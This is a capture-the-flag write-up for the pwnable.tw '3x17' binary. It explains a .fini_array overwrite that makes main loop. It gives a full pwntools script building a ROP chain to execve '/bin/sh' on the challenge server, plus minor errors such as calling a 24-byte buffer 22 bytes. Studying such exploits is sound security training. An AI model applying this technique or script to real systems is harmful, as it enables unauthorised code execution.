# 3x17

file:
```
3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
```

checksec:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No      0               0       3x17
```

## solution

The program prompts for an address and some data and then seems to do nothing.

I prefer to analyze stripped files in ghidra rather than r2 since its easier to browse and edit as I go along. Decompiling the main function with some renaming:

```cpp
ulong main(void)
{
  int v1;
  ulong result;
  long in_FS_OFFSET;
  undefined buf [24];
  long v2;
  
  v2 = *(long *)(in_FS_OFFSET + 0x28);
  DAT_004b9330 = DAT_004b9330 + 1;
  result = (ulong)DAT_004b9330;
  if (DAT_004b9330 == 1) {
    write(1,"addr:",5);
    read(0,buf,0x18);
    v1 = FUN_0040ee70(buf);
    write(1,"data:",5);
    read(0,(long)v1,0x18);
    result = 0;
  }
  if (v2 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    stack_smashing_detector();
  }
  return result;
}
```

So given some unity conditional statement, the binary will prompt the user for an "addr" and stores that in a length 22 buffer. It calls some function and returns the value into v1. It then prompts the user for a "data" and stores that in another length 22 buffer (v1). Conducting dynamic analysis yields the conclusion that entering in 22 characters+ of input will cause a premature exit.

I guess `stack_smashing_detector()` is a custom stack canary?

```cpp
void stack_smashing_detector(void)
{
  char *pcVar1;
  char *pcVar2;
  char cVar3;
  
  pcVar2 = "stack smashing detected";
  cVar3 = '\0';
  actual_stack_smashing_detector(0,"stack smashing detected");
  if (cVar3 == '\0') {
    do {
      FUN_00413260(1,"*** %s ***: %s terminated\n",pcVar2,"<unknown>");
    } while( true );
  }
  do {
    pcVar1 = *DAT_004ba940;
    if (pcVar1 == (char *)0x0) {
      pcVar1 = "<unknown>";
    }
    FUN_00413260(3,"*** %s ***: %s terminated\n",pcVar2,pcVar1);
  } while( true );
}
```


We need to find an address for overwriting since that is the purpose of the program. We can check if we have a writable initialization/termination sections using readelf. We do have a writable `.fini_array` section.

```sh
$ readelf -S ./3x17 
[15] .init_array       INIT_ARRAY       00000000004b40e0  000b30e0
       0000000000000010  0000000000000008  WA       0     0     8
[16] .fini_array       FINI_ARRAY       00000000004b40f0  000b30f0
       0000000000000010  0000000000000008  WA       0     0     8
```

The way it works is that the runtime linker proccesses initialization sections (.init etc) before transferring control to the program. When the program terminates, the runtime linker proccesses its termination functions (.fini etc). The `.fini_array` contains the address of a destructor function which will be executed when the program terminates. This is interesting because if we overwrite `.fini_array` with the start address of the `main` function, upon termination the program will start again rather, allowing us to repeatedly enter data. This is abusable.

So for each set (addr, data) of inputs, the addr is the address we want to write data to. This will be the fini_array address + offset.

If we look back to the `entry` function.

```cpp
void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3)
{
  undefined8 in_stack_00000000;
  
  __libc_start_main(main,in_stack_00000000,&stack0x00000008,FUN_004028d0,FUN_00402960,param_3);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

Referring to the [linux standard base specification](https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html), we observe the `FUN_0042960` is the `.fini_array` which is at address 0x00402960. The gadget addresses can be found using `ROPgadget`, and the `syscall` address can be found with `objdump -d`.

Our exploit chain looks something like this, with each line being a new input into the program:

```
- addr: fini_array        data: .fini_array call + main (overwrite with main)
- addr: fini_array+2*8    data: pop_rdi + (fini_array + 11*8)
- addr: fini_array+4*8    data: pop_rdx + padding
- addr: fini_array+6*8    data: pop_rsi + padding
- addr: fini_array+8*8    data: pop_rax + 0x3b (0x3b syscall is sys_execve)	
- addr: fini_array+10*8   data: syscall + /bin/sh
- addr: fini_array        data: leave_ret (so we stop looping)
```

Once we have the shell, just `cat /home/3x17/the_4ns_is_51_fl4g`. The python script is below

```py
#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10105)
    else:
        p = elf.process()

context(os="linux") 
context.binary = elf = ELF("./3x17")
#context.log_level = "debug"
start()


main = 0x401b6d
fini = 0x402960
fini_array = 0x4b40f0
syscall = 0x04022b4

pop_rdi = 0x0401696
pop_rdx = 0x0406c30
pop_rsi = 0x0446e35
pop_rax = 0x041e4af
leave_ret = 0x0401c4b

def send(addr, data):
    p.sendlineafter(b"addr:", str(addr))
    p.sendafter(b"data:", data)

send(fini_array, p64(fini) + p64(main))
send(fini_array+16, p64(pop_rdi) + p64(fini_array + 11*8))
send(fini_array+32, p64(pop_rdx) + p64(0))
send(fini_array+48, p64(pop_rsi) + p64(0))
send(fini_array+64, p64(pop_rax) + p64(0x3b))
send(fini_array+80, p64(syscall) + b"/bin/sh\x00")
send(fini_array, p64(leave_ret))

p.interactive()
```
